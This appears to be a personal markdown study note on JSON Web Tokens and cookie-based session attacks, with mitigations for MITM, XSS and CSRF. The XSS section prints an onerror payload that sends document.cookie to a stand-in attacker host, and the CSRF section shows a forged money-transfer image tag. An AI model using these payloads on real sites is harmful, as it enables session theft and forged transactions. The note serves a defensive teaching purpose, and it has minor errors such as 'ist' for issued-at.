# JWT - JSON Web Token
**JWT:** is a open standard for passing claims
### Tutorial:
[Tutorial: http://mherman.org](http://mherman.org/blog/2016/10/28/token-based-authentication-with-node/#.WGpZXDsOZx9.hackernews)
 
### Can be passed:
* as part of URL (Query String)
* form body parameter,
* cookie
* HTTP Header (x-access token)

### JWT is great for single sign-on context
If you have multiple websites, you can use the same token 
across these websites. These websites can share the same token.
The authentication can be done on one website, and the same token is shared among several websites.

## JWT - Structure
A JWT consists of 3 sections **header**, **payload** and **signature** separated with dots.
All sections are base64 encoded! 
**ATTENTION:** the sections are just *encoded*, and **NOT ENCRYPTED**!

####Example:
```

=========           =========
 header             signature
=========           =========
abcabcabc.mnomnomno.xyzxyzxyz
          =========
		   payload
		  =========
```

1. **HEADER**: usually contains 2 parts and is in JSON
	* **typ** - should be "*JWT*"<br>
	* **alg** - hashing algorithm used to encrypt, sign and hash the JWT (HS256, RS256, ES384 etc.) 	

	```javascript
		{
			"typ" : "JWT", 
			"alg" : "HS256"   
		}
	```	
	
2. **PAYLOAD** contains: 
	* the information we need to transmit (e.g.: username, email, firstname, lastname)	-the data used by the application
	* the information related to token itself
	* this data is also referred to "**claims**"
	* A "**claim**" are key-value pairs
		* default keys defined in the JWT-standard: (but you can add your own keys)
		
			```
				iss - issuer			// issuer, which service app is issueing this token
				sub - subject
				aud - audience
				exp - expiration time
				nbf - not before		// not before date
				ist - issued at
				jti - JWT id
			```
			
	#### Example:				
	```javascript
			{
				"iss" : "ABC Service App",
				"name": "Jag",				// custom key
				"admin": false				// custom key
			}
	```

	Again:
	all three (header, payload and signature) need to be base64 encoded.
	Entire information can be seen by a third party. but it cannot be **modified**, without the user noticing it.

3. SIGNATURE**
	* A hash of **header** and **payload** using a **secret**
	
	```javascript
		var s = base64Encode(header)
				+ "."
				+ base64Encode(payload);
		var signature = hashAlgHs256(s, 'secret');		// the header + payload need to match the signature.
		var jwt =  s + "." + base64Encode(signature);   // if they don't match the token is invalid
	```

## JWT - IN REAL WORLD
1. STEP: The client requests token from server (by providing AUTH.Credentials) 
2. STEP: The server checks credentials and creates a TOKEN (JWT) 
3. STEP: The server sends token to client.
4. STEP: The client verifies token, extracts information and stored somewhere at client-side!
5. STEP: From now client uses (persistent) token for subsequents calls to server. No need to send credentials anymore 	
6. STEP: Server verifies token for all subsequent requests
		Server can see when token will expire, at what time it is valid,etc,...
		
## JWT - helpful links
* **Create JWT**<br>
[http://jwtbuilder.jamiekurtz.com/](http://jwtbuilder.jamiekurtz.com/)<br>
[http://jwtbuilder.jamiekurtz.com/](http://jwtbuilder.jamiekurtz.com/)<br>
* **Verify JWT**<br>
[https://jwt.io/](https://jwt.io/)<br>
* **Base64 encode/decode**<br>
[https://www.base64encode.org/](https://www.base64encode.org/)<br>
[https://www.base64decode.org/](https://www.base64decode.org/)<br>
	

## JWT vs. SessionIds

**SessionIds cons:**
* the have no meaning. sessionId=aS37Ha329s
* database heavy: session-ID lookup on *every request*
* cookies need to be secured to prevent cookie (sessionId) hijacking 
* you can do cookie wrong, but when done right they are a good way for securing authentication information on the browser. 

### 3 Attack vectors for cookies:
1. Man-in-the-Middle (MITM)<br>
   Somone "listening on the wire". Easy to do on WIFI!<br>
   **SOLUTION:**<br>
   * Use HTTPS/TLS everywhere a cookie will be transit
   * Set **Secure** flag on cookies. (browser will send cookie only when connection is secure)
   
2. Cross-Site Scripting (XSS)
	This is a very REAL problem<br>
	Happens when attacker code is run inside a browser, on your domain.
	**Can be used to steal your cookies!**
	**EXAMPLE**<br>
	```javascript
	<img src=x onerror="document.body.appendChild(
	 function(){
		var a = document.createElement("img");
		a.src='https://yourarehackednow.com/yourCookies.png/?cookies='document.cookie;return a
	 }())"
	 
	```
	The tag is broken, but this makes the browser to run the onerror code and append and image with cookie-parameter.<br>
	
	**SOLUTION 1:** ESCAPE CONTENT! <br>
	* **Server-side** use well-known, trusted libraries, to ensure dynamic html does not contain executable code.<br>
	  **Do NOT roll your own!**
	* **Client Side**: Escape user input from forms<br>
	
	**SOLUTION 2:** Use HTTPS-Only cookies! <br>
	* set the HttpOnly flag on your authentication cookies.
	* HttpOnly cookies are NOT accessible by the JavaScript environment
	* document.cookie cannot cookie
	* javascript cannot use cookie to determine whether you are logged in or not
	* you need to make a call to the API, that then tells you the status
	
3. Cross-Site Request Forgery (CSRF)
	Exploits the fact that some **HTML tags** do NOT follow the **Same Origin Policy** when making GET requests.
	* <img> is one of those tags
	* **Example:** Attacker puts malicious image into some (his own) web page that the user visits:
	* Lets asume that money can be transfered by following that url:
	
	```html
		<img src="https://trustyapp.com/transferMoney?to=BadGuy&amount=1000" />		
	```
	What happens?<br>
	* Browser sends cookies for trustyapp.com
	* The server trusts cookies AND assumes this was an intended user action.
	* server transfers money!

	**THE SOLUTIONS:**
	* Synchronizer Token (for form-based apps) doesn't help with ajax based rich clients, for those use Double submit cookie
	* Double-Submit Cookie (for modern apps)
	
	## Double submit Cookie:
	
	* Give client 2 Cookies: 
		1. SessionId and 
		2. strong random value
	* Client sends back the random value in a custom **HTTP header**!! Because then the "Same-Origin Policy" kicks in.
	* Browsers doesn't allow custom headers, if we are going to a different domain!
		

**Authentication:** is proving who you are.<br>
**Authorization:** is being granted access to resources.<br>
**Tokens:** are used to persist authentication and get authorization<br>
**JWT** is a token format


JWT look like this:
```
	t21aSKjslsdlwk3lsSKJSlk32d.32ylylasldfkfaMa
	sdflkasdfkmlyiea33ss23asdf2230ylsadsaf
	asdflwjala.alsdfiowoaisdfj_lalalsjfjalSKHE
```

[https://www.youtube.com/watch?v=mecILj3p4VA](https://www.youtube.com/watch?v=mecILj3p4VA)	
